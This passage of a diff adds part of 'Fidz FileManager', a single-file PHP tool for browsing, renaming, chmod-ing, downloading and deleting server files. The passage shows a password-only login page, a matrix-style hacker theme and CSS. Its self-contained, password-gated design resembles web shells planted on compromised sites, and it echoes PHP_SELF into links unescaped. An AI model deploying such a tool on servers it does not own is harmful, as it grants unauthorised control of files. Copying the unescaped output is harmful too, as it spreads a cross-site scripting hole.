+        <?php if ($isDir): ?>
+          <a class="item dir" href="<?= $_SERVER['PHP_SELF'] ?>?path=<?= urlencode($abs) ?>"><span class="ico"><?= $icon ?></span> <?= htmlspecialchars($name) ?>/</a>
+        <?php else: ?>
+          <a class="item" href="<?= $_SERVER['PHP_SELF'] ?>?do=edit&path=<?= urlencode($abs) ?>"><span class="ico"><?= $icon ?></span> <?= htmlspecialchars($name) ?></a>
+        <?php endif; ?>
+      </td>
+      <td class="muted"><?= $size ?></td>
+      <td class="muted" style="color:<?= $color ?>;font-family:monospace"><?= $perm ?></td>
+      <td class="muted"><?= $mtime ?></td>
+      <td class="actions">
+        <form method="post" class="inline" onsubmit="return confirm('Ganti nama?')">
+          <input type="hidden" name="do"   value="rename">
+          <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+          <input type="hidden" name="csrf" value="<?= $_SESSION['fm_csrf'] ?>">
+          <input type="hidden" name="old"  value="<?= htmlspecialchars($abs) ?>">
+          <input type="text" name="new" placeholder="nama baru" required class="mini">
+          <button class="btn mini-btn" title="Rename">✏</button>
+        </form>
+        <form method="post" class="inline" onsubmit="var p=prompt('Permission (mis. 0644):','0644'); if(p){this.perm.value=p; return true;} return false;">
+          <input type="hidden" name="do"     value="chmod">
+          <input type="hidden" name="path"   value="<?= htmlspecialchars($path) ?>">
+          <input type="hidden" name="csrf"   value="<?= $_SESSION['fm_csrf'] ?>">
+          <input type="hidden" name="target" value="<?= htmlspecialchars($abs) ?>">
+          <input type="hidden" name="perm"   value="0644">
+          <button class="btn mini-btn" title="Chmod">🔒</button>
+        </form>
+        <a href="<?= $_SERVER['PHP_SELF'] ?>?do=download&path=<?= urlencode($abs) ?>" class="btn mini-btn" title="Download">⬇</a>
+        <form method="post" class="inline" onsubmit="return confirm('Hapus <?= htmlspecialchars($name) ?>?')">
+          <input type="hidden" name="do"     value="delete">
+          <input type="hidden" name="path"   value="<?= htmlspecialchars($path) ?>">
+          <input type="hidden" name="csrf"   value="<?= $_SESSION['fm_csrf'] ?>">
+          <input type="hidden" name="target" value="<?= htmlspecialchars($abs) ?>">
+          <button class="btn mini-btn danger" title="Hapus">🗑</button>
+        </form>
+      </td>
+    </tr>
+  <?php endforeach; ?>
+  <?php if (!$items): ?>
+    <tr><td colspan="5" style="text-align:center;padding:40px;color:#4a5568;font-family:monospace">&gt; folder kosong_</td></tr>
+  <?php endif; ?>
+  </tbody>
+</table>
+</div>
+<?php
+render_footer();
+exit;
+
+/* =========================================================
+ *  RENDER FUNCTIONS
+ * ========================================================= */
+function render_login(string $err) { ?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ACCESS TERMINAL — Fidz FileManager</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
+<style><?= css() ?></style>
+</head>
+<body class="login-body">
+  <div class="matrix-bg" id="matrixBg"></div>
+  <div class="scanlines"></div>
+  <form method="post" class="login-box">
+    <div class="brand-top"><span class="tag">[ SECURE TERMINAL ]</span></div>
+    <h1 class="cyber-title">FIDZ <span class="accent">FILEMANAGER</span></h1>
+    <p class="sub-title">ADMIN <span class="accent-2">3LENSA</span></p>
+    <div class="divider"></div>
+    <?php if ($err): ?><div class="err"><?= htmlspecialchars($err) ?></div><?php endif; ?>
+    <div class="input-wrap">
+      <span class="prompt">$</span>
+      <input type="hidden" name="action" value="login">
+      <input type="password" name="password" placeholder="ENTER PASSCODE" autofocus required autocomplete="off">
+    </div>
+    <button type="submit" class="cyber-btn"><span>▶ AUTHENTICATE</span></button>
+    <div class="login-footer"><span class="dot"></span> SECURE CONNECTION ESTABLISHED</div>
+  </form>
+  <script>
+    const canvas=document.createElement('canvas'),bg=document.getElementById('matrixBg');
+    bg.appendChild(canvas);const ctx=canvas.getContext('2d');let W,H,cols,drops;
+    function resize(){W=canvas.width=bg.clientWidth;H=canvas.height=bg.clientHeight;
+      cols=Math.floor(W/16);drops=Array(cols).fill(1);}
+    resize();window.addEventListener('resize',resize);
+    const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF<>{}[]$#@%&*+=?';
+    function draw(){ctx.fillStyle='rgba(0,5,0,0.08)';ctx.fillRect(0,0,W,H);
+      ctx.fillStyle='#00ff9d';ctx.font='15px "Share Tech Mono",monospace';
+      for(let i=0;i<drops.length;i++){const ch=chars[Math.floor(Math.random()*chars.length)];
+        ctx.fillText(ch,i*16,drops[i]*16);
+        if(drops[i]*16>H&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
+    setInterval(draw,45);
+  </script>
+</body></html>
+<?php }
+
+function render_header(string $title) { ?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title><?= htmlspecialchars($title) ?> — Fidz FileManager</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
+<style><?= css() ?></style>
+</head>
+<body class="dash-body">
+<div class="scanlines"></div>
+<div class="wrap">
+  <div class="brand-bar">
+    <div class="brand-left">
+      <div class="brand-logo">◆</div>
+      <div>
+        <div class="brand-name">FIDZ <span class="accent">FILEMANAGER</span></div>
+        <div class="brand-sub">ADMIN <span class="accent-2">3LENSA</span> · CYBER OPS v5.0</div>
+      </div>
+    </div>
+    <div class="brand-right"><span class="status-dot"></span> ONLINE</div>
+  </div>
+<?php }
+
+function render_footer() { ?>
+  <div class="footer">
+    <span>◈ FIDZ FILEMANAGER · ADMIN 3LENSA</span>
+    <span class="footer-right">[ <?= date('Y-m-d H:i:s') ?> ]</span>
+  </div>
+</div>
+</body></html>
+<?php }
+
+function css() { return <<<CSS
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg-0:#05080d;--cyber:#00ff9d;--cyber-glow:rgba(0,255,157,.5);
+--accent:#00d9ff;--accent-glow:rgba(0,217,255,.4);--danger:#ff2952;
+--danger-glow:rgba(255,41,82,.5);--text:#c8f7e4;--text-dim:#6b8a80;
+--border:rgba(0,255,157,.2);--mono:'Share Tech Mono','Courier New',monospace;
+--display:'Orbitron',sans-serif}
+body{font-family:var(--mono);background:var(--bg-0);color:var(--text);
+font-size:14px;line-height:1.5;min-height:100vh;position:relative;overflow-x:hidden}
+.scanlines{position:fixed;inset:0;pointer-events:none;z-index:9999;
+background:repeating-linear-gradient(to bottom,rgba(0,255,157,.03) 0px,
+rgba(0,255,157,.03) 1px,transparent 1px,transparent 3px)}
+.login-body{display:flex;align-items:center;justify-content:center;min-height:100vh;
+background:radial-gradient(ellipse at center,#0a1520 0%,#000 100%);overflow:hidden}
+.matrix-bg{position:fixed;inset:0;z-index:0;opacity:.35}
+.matrix-bg canvas{display:block;width:100%;height:100%}
+.login-box{position:relative;z-index:10;
+background:linear-gradient(180deg,rgba(10,20,30,.95),rgba(5,10,18,.98));
+border:1px solid var(--border);border-radius:4px;padding:44px 36px 32px;
+width:400px;max-width:calc(100vw - 40px);text-align:center;
+box-shadow:0 0 0 1px rgba(0,255,157,.1),0 0 40px rgba(0,255,157,.2),
+0 0 80px rgba(0,217,255,.1),inset 0 0 60px rgba(0,255,157,.05);
+animation:loginGlow 3s ease-in-out infinite alternate}
+@keyframes loginGlow{from{box-shadow:0 0 0 1px rgba(0,255,157,.1),0 0 40px rgba(0,255,157,.15),inset 0 0 60px rgba(0,255,157,.04)}
+to{box-shadow:0 0 0 1px rgba(0,255,157,.3),0 0 60px rgba(0,255,157,.35),0 0 100px rgba(0,217,255,.15),inset 0 0 80px rgba(0,255,157,.08)}}
+.login-box::before,.login-box::after{content:'';position:absolute;width:22px;height:22px;border:2px solid var(--cyber)}
+.login-box::before{top:-1px;left:-1px;border-right:none;border-bottom:none}
+.login-box::after{bottom:-1px;right:-1px;border-left:none;border-top:none}
+.brand-top{margin-bottom:20px}
+.tag{display:inline-block;font-size:10px;letter-spacing:3px;color:var(--cyber);
+background:rgba(0,255,157,.08);border:1px solid var(--border);padding:4px 12px;border-radius:2px}
+.cyber-title{font-family:var(--display);font-size:26px;font-weight:900;letter-spacing:2px;
+color:#fff;text-shadow:0 0 10px var(--cyber-glow),0 0 20px var(--cyber-glow);margin-bottom:6px}
+.cyber-title .accent{color:var(--cyber);text-shadow:0 0 12px var(--cyber-glow),0 0 24px var(--cyber-glow)}
+.sub-title{font-family:var(--display);font-size:12px;letter-spacing:6px;color:var(--text-dim);margin-bottom:22px}
+.accent-2{color:var(--accent);text-shadow:0 0 10px var(--accent-glow)}
+.divider{height:1px;background:linear-gradient(90deg,transparent,var(--cyber),transparent);
+margin:0 0 24px;box-shadow:0 0 8px var(--cyber-glow)}
+.input-wrap{display:flex;align-items:center;background:rgba(0,0,0,.6);
+border:1px solid var(--border);border-radius:3px;padding:0 14px;margin-bottom:14px;transition:.2s}
+.input-wrap:focus-within{border-color:var(--cyber);
+box-shadow:0 0 12px var(--cyber-glow),inset 0 0 8px rgba(0,255,157,.1)}
+.prompt{color:var(--cyber);font-weight:bold;margin-right:8px;font-size:16px}
+.input-wrap input{flex:1;background:transparent;border:none;outline:none;color:var(--text);
+font-family:var(--mono);font-size:15px;letter-spacing:2px;padding:14px 0}
+.input-wrap input::placeholder{color:var(--text-dim);letter-spacing:3px;font-size:12px}
+.cyber-btn{width:100%;padding:14px;background:transparent;color:var(--cyber);
+border:1px solid var(--cyber);border-radius:3px;font-family:var(--display);font-weight:700;
+font-size:14px;letter-spacing:3px;cursor:pointer;position:relative;overflow:hidden;
+transition:.2s;margin-top:8px}
+.cyber-btn span{position:relative;z-index:2}
+.cyber-btn::before{content:'';position:absolute;inset:0;background:var(--cyber);
+transform:translateX(-100%);transition:transform .3s;z-index:1}
+.cyber-btn:hover{color:#000;box-shadow:0 0 20px var(--cyber-glow),0 0 40px var(--cyber-glow)}
+.cyber-btn:hover::before{transform:translateX(0)}
+.login-footer{margin-top:22px;font-size:10px;color:var(--text-dim);letter-spacing:2px;
+display:flex;align-items:center;justify-content:center;gap:8px}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--cyber);
+box-shadow:0 0 8px var(--cyber);animation:blink 1.5s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.err{background:rgba(255,41,82,.1);border:1px solid var(--danger);color:var(--danger);
+padding:10px;border-radius:3px;margin-bottom:18px;font-size:12px;letter-spacing:1px;
+box-shadow:0 0 12px var(--danger-glow)}
+.dash-body{background:radial-gradient(ellipse at top,rgba(0,255,157,.05),transparent 60%),
+radial-gradient(ellipse at bottom right,rgba(0,217,255,.05),transparent 60%),var(--bg-0);min-height:100vh}
+.wrap{max-width:1300px;margin:0 auto;padding:20px;position:relative;z-index:2}
+.brand-bar{display:flex;align-items:center;justify-content:space-between;
+background:linear-gradient(180deg,rgba(0,255,157,.05),rgba(0,255,157,.01));
+border:1px solid var(--border);border-radius:4px;padding:14px 20px;margin-bottom:20px;
+position:relative;box-shadow:0 0 20px rgba(0,255,157,.1),inset 0 0 30px rgba(0,255,157,.03)}
+.brand-bar::before,.brand-bar::after{content:'';position:absolute;width:16px;height:16px;border:2px solid var(--cyber)}
+.brand-bar::before{top:-1px;left:-1px;border-right:none;border-bottom:none}
+.brand-bar::after{bottom:-1px;right:-1px;border-left:none;border-top:none}
+.brand-left{display:flex;align-items:center;gap:14px}
+.brand-logo{width:42px;height:42px;display:flex;align-items:center;justify-content:center;
+background:rgba(0,255,157,.1);border:1px solid var(--cyber);border-radius:3px;
+color:var(--cyber);font-size:20px;text-shadow:0 0 10px var(--cyber);
+box-shadow:0 0 15px var(--cyber-glow);animation:logoPulse 2s ease-in-out infinite}
+@keyframes logoPulse{0%,100%{box-shadow:0 0 15px var(--cyber-glow)}50%{box-shadow:0 0 25px var(--cyber-glow),inset 0 0 10px var(--cyber-glow)}}
+.brand-name{font-family:var(--display);font-size:18px;font-weight:900;letter-spacing:2px;
+color:#fff;text-shadow:0 0 10px var(--cyber-glow)}
+.brand-name .accent{color:var(--cyber)}
+.brand-sub{font-size:10px;letter-spacing:3px;color:var(--text-dim);margin-top:2px}
+.brand-right{display:flex;align-items:center;gap:8px;font-size:11px;letter-spacing:2px;color:var(--cyber)}
+.status-dot{width:8px;height:8px;border-radius:50%;background:var(--cyber);
+box-shadow:0 0 10px var(--cyber);animation:blink 1.5s infinite}
+.toolbar{display:flex;align-items:center;gap:12px;background:rgba(10,20,30,.7);
+border:1px solid var(--border);border-radius:4px;padding:12px 16px;margin-bottom:16px;
+flex-wrap:wrap;backdrop-filter:blur(6px)}
+.toolbar .path{font-family:var(--mono);color:var(--cyber);font-weight:600;
+text-shadow:0 0 8px var(--cyber-glow);word-break:break-all;max-width:100%}
+.toolbar .stat,.toolbar .size{color:var(--text-dim);font-size:12px;letter-spacing:1px}
+.crumb{color:var(--cyber);text-decoration:none;padding:3px 7px;border-radius:3px;
+transition:.15s;border:1px solid transparent;text-shadow:0 0 8px var(--cyber-glow);
+display:inline-block;line-height:1.2;font-family:var(--mono);font-weight:600}
+.crumb:hover{background:rgba(0,255,157,.15);border-color:var(--cyber);
+box-shadow:0 0 10px var(--cyber-glow);color:#fff}
+.crumb-sep{color:var(--text-dim);opacity:.7;margin:0 2px;font-weight:400}
+.spacer{flex:1}
+.btn{display:inline-block;padding:7px 14px;border-radius:3px;background:rgba(0,255,157,.05);
+color:var(--cyber);text-decoration:none;font-size:12px;border:1px solid var(--border);
+cursor:pointer;font-family:var(--mono);font-weight:500;letter-spacing:1px;transition:.15s}
+.btn:hover{background:rgba(0,255,157,.15);border-color:var(--cyber);box-shadow:0 0 12px var(--cyber-glow)}
+.btn.primary{background:rgba(0,255,157,.1);color:var(--cyber);border-color:var(--cyber)}
+.btn.primary:hover{background:var(--cyber);color:#000;box-shadow:0 0 20px var(--cyber-glow)}
+.btn.danger{background:rgba(255,41,82,.1);color:var(--danger);border-color:var(--danger)}
+.btn.danger:hover{background:var(--danger);color:#fff;box-shadow:0 0 20px var(--danger-glow)}
+.btn.disabled{opacity:.3;pointer-events:none}
+.btn.mini-btn{padding:5px 9px;font-size:11px}
+.panels{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px;margin-bottom:18px}
+.panel{background:linear-gradient(180deg,rgba(0,255,157,.03),rgba(0,0,0,.3));
+border:1px solid var(--border);border-radius:4px;padding:16px;position:relative;transition:.2s}
+.panel:hover{border-color:rgba(0,255,157,.4);box-shadow:0 0 20px rgba(0,255,157,.1)}
+.panel h3{font-family:var(--display);font-size:12px;letter-spacing:3px;color:var(--cyber);
+margin-bottom:14px;text-shadow:0 0 8px var(--cyber-glow)}
+.panel form{display:flex;gap:8px;flex-wrap:wrap}
+.panel input[type=text],.panel input[type=file]{flex:1;min-width:120px;padding:9px 12px;
+background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:3px;color:var(--text);
+font-family:var(--mono);font-size:12px;letter-spacing:1px;outline:none;transition:.2s}
+.panel input[type=text]:focus,.panel input[type=file]:focus{border-color:var(--cyber);box-shadow:0 0 10px var(--cyber-glow)}
+.panel input::placeholder{color:var(--text-dim)}
+.panel input[type=file]::file-selector-button{background:rgba(0,255,157,.1);color:var(--cyber);
+border:1px solid var(--border);padding:4px 10px;border-radius:3px;font-family:var(--mono);
+font-size:11px;cursor:pointer;margin-right:10px;transition:.15s}
+.panel input[type=file]::file-selector-button:hover{background:var(--cyber);color:#000}
+.table-wrap{border:1px solid var(--border);border-radius:4px;overflow:hidden;
+background:rgba(5,10,18,.6);backdrop-filter:blur(6px);box-shadow:0 0 20px rgba(0,255,157,.05)}
+.fm-table{width:100%;border-collapse:collapse}
+.fm-table th{text-align:left;padding:12px 16px;background:rgba(0,255,157,.06);
+font-family:var(--display);font-size:10px;letter-spacing:3px;color:var(--cyber);
+border-bottom:1px solid var(--border);text-shadow:0 0 6px var(--cyber-glow)}
+.fm-table td{padding:10px 16px;border-bottom:1px solid rgba(0,255,157,.06);font-size:13px;vertical-align:middle}
+.fm-table tr:last-child td{border-bottom:none}
+.fm-table tbody tr{transition:.15s}
+.fm-table tbody tr:hover{background:rgba(0,255,157,.05);box-shadow:inset 3px 0 0 var(--cyber)}
+.item{color:var(--text);text-decoration:none;word-break:break-all;display:flex;align-items:center;gap:8px;transition:.15s}
+.item .ico{font-size:15px;filter:saturate(1.2)}
+.item:hover{color:var(--cyber);text-shadow:0 0 10px var(--cyber-glow)}
+.item.dir{font-weight:600;color:#fff}
+.item.dir:hover{color:var(--accent);text-shadow:0 0 10px var(--accent-glow)}
+.muted{color:var(--text-dim);font-size:12px}
+.actions{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.actions .inline{display:inline-flex;gap:4px}
+.mini{padding:5px 8px;background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:3px;
+color:var(--text);font-family:var(--mono);font-size:11px;width:110px;outline:none}
+.mini:focus{border-color:var(--cyber);box-shadow:0 0 8px var(--cyber-glow)}
+.mini::placeholder{color:var(--text-dim)}
+.flash{padding:12px 16px;border-radius:4px;margin-bottom:14px;font-size:13px;
+letter-spacing:1px;border-left:3px solid;word-break:break-word}
+.flash.ok{background:rgba(0,255,157,.08);color:var(--cyber);border-color:var(--cyber);box-shadow:0 0 15px rgba(0,255,157,.15)}
+.flash.err{background:rgba(255,41,82,.08);color:var(--danger);border-color:var(--danger);box-shadow:0 0 15px var(--danger-glow)}
+.editor-form{display:flex;flex-direction:column;gap:12px}
+.editor-form textarea{width:100%;min-height:65vh;padding:18px;font-family:var(--mono);
+font-size:13px;background:rgba(0,0,0,.7);color:var(--cyber);border:1px solid var(--border);
+border-radius:4px;line-height:1.6;resize:vertical;outline:none;letter-spacing:.3px;
+text-shadow:0 0 4px rgba(0,255,157,.4);caret-color:var(--cyber);
+box-shadow:inset 0 0 30px rgba(0,255,157,.05)}
+.editor-form textarea:focus{border-color:var(--cyber);
+box-shadow:inset 0 0 30px rgba(0,255,157,.08),0 0 20px rgba(0,255,157,.15)}
+.editor-actions{display:flex;gap:10px;flex-wrap:wrap}
+.footer{margin-top:30px;padding:16px 20px;border-top:1px solid var(--border);
+display:flex;justify-content:space-between;font-size:11px;letter-spacing:2px;
+color:var(--text-dim);font-family:var(--display)}
+.footer-right{color:var(--cyber);text-shadow:0 0 6px var(--cyber-glow)}
+@media(max-width:640px){
+.brand-name{font-size:14px}.brand-sub{font-size:9px;letter-spacing:2px}
+.cyber-title{font-size:20px}.sub-title{font-size:10px;letter-spacing:4px}
+.login-box{padding:32px 22px 24px}.panels{grid-template-columns:1fr}
+.fm-table th,.fm-table td{padding:8px 10px;font-size:12px}.mini{width:80px}}
+CSS; }
